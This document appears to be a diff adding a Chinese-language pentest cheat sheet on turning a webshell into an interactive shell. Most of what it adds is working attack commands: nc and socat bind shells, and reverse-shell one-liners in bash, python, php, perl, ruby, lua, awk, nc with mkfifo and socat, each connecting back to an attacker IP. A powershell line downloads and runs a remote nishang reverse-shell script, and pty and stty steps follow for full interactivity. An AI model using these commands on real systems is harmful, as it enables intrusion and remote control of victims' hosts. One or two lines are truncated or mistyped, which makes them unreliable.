@@ -6,12 +6,37 @@ webshell升级为交互式shell
 
 为什么需要交互式shell？
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- | Webshell 里经常会看到一些 命令执行, 虚拟终端 之类的可以执行系统命令的功能，原理就是通过脚本语言自身提供的 system, popen, shell_exec 之类的函数来完成执行命令的目的。这种方式不支持上下文，并且在面对一些需要用户交互的命令时，就显得很鸡肋了。
+Webshell 里经常会看到一些 命令执行, 虚拟终端 之类的可以执行系统命令的功能，原理就是通过脚本语言自身提供的 system, popen, shell_exec 之类的函数来完成执行命令的目的。这种方式不支持上下文，并且在面对一些需要用户交互的命令时，就显得很鸡肋了。
 
- | 比如说passwd命令:
- | - root@localhost:/# passwd root
- | - Enter new UNIX password: [这里需要用户按下键盘]
- | - Retype new UNIX password: [这里需要用户按下键盘]
+比如说passwd命令:
+	- root@localhost:/# passwd root
+	- Enter new UNIX password: [这里需要用户按下键盘]
+	- Retype new UNIX password: [这里需要用户按下键盘]
+
+存在问题：
+	- 无法使用vim等文本编辑器
+	- 不能补全
+	- 不能su
+	- 没有向上箭头使用历史
+
+正向shell
+----------------------------------------
+
+nc正向shell
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- server
+	``nc -l 1567 -e /bin/bash -i`` 
+	``nc -lvp 1567 -e c:\windows\system32\cmd.exe`` 
+- client
+	``nc 172.31.100.7 1567`` 
+
+socat正向shell
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- server
+	``socat TCP-LISTEN:12345 EXEC:/bin/bash`` 
+- client
+	``nc 192.168.x.x 12345`` 
+
 
 反弹shell
 ----------------------------------------
@@ -32,6 +57,109 @@ webshell升级为交互式shell
 	- 4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。
 
 	那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。
+
+常用反弹shell
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+- bash反向shell
+
+::
+
+	vps：nc -lvp 4444
+	bash -i >& /dev/tcp/192.168.174.130/4444 0>&1
+
+- python反向shell
+
+::
+
+	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+- php反向shell
+
+::
+
+	php -r '$sock=fsockopen("192.168.174.130",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+- Perl反向shell 
+
+::
+
+	perl -e 'use Socket;$i="192.168.174.130";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+	linux：perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.174.130:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+	windwos：perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"192.168.174.130:4444");STDIN->f
+
+- socat反向shell
+
+::
+
+	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.174.130:4444
+
+- Ruby反向shell
+
+::
+
+	ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.174.130","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+	linux：ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.166","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+	windows：ruby -rsocket -e 'c=TCPSocket.new("10.10.10.166","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+- Lua反向shell
+
+::
+
+	lua -e "require('socket');require('os');t=socket.tcp();t:connect('192。168.174.130','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+
+- Awk反向shell
+
+::
+
+	awk 'BEGIN{s="/inet/tcp/0/192.168.174.130/4444";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
+
+- exec反向shell 
+
+::
+
+	exec 5<>/dev/tcp/192.168.174.130/4444 cat <&5 | while read line; do $line 2>&5 >&5; done
+	0<&196;exec 196<>/dev/tcp/192.168.174.130/4444; sh <&196>&196 2>&196
+
+- nc反向shell
+
+::
+
+	client(vps)：nc -l 1567
+	server：nc 172.31.100.7 1567 -e /bin/bash
+	server：nc 192.168.174.130 9999 -e c:\windows\system32\cmd.exe
+	server：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.174.130 4444 >/tmp/f
+
+- powershell反弹shell
+
+::
+
+	apt-get install powshell
+	powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.174.130 -port 4444
+
+shell升级为交互式shell
+-----------------------------------------
+
+- 半交互式shell
+
+::
+
+	通常我们nc获得的shell都是不完全shell，需要通过Python的pty转换为半交互式shell。 
+	python -c "import pty;pty.spawn('/bin/bash')"
+	可以运行su命令。
+
+- 完全交互式Shell
+
+::
+
+	$ python -c 'import pty; pty.spawn("/bin/bash")'
+	Ctrl-Z
+	$ stty raw -echo
+	$ fg
+	$ reset
+	$ export SHELL=bash
+	//$ export TERM=xterm-256color
+
 
 shell升级为meterpreter
 -----------------------------------------
